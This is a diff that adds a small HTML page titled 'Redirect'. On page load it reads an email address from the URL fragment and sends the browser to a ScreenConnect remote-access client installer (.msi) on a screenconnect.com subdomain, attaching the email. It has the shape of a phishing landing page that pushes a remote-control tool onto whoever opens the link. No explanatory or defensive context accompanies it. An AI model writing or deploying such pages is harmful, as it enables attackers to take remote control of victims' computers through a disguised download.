@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect</title>
+    <script>
+        // Simplified redirect logic
+        document.addEventListener("DOMContentLoaded", function() {
+            // Check if there's a hash in the URL
+            const email = location.hash.substring(1); // Get everything after the #
+
+            // Base URL
+            const baseUrl = "https://thirty6red1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest/";
+
+            // Redirect based on hash value
+            if (email) {
+                // Redirect with email as a query parameter
+                window.location.href = `${baseUrl}$${(email)}`;
+            } else {
+                // Redirect to the base URL if no hash
+                window.location.href = baseUrl;
+            }
+        });
+    </script>
+</head>
+</html>
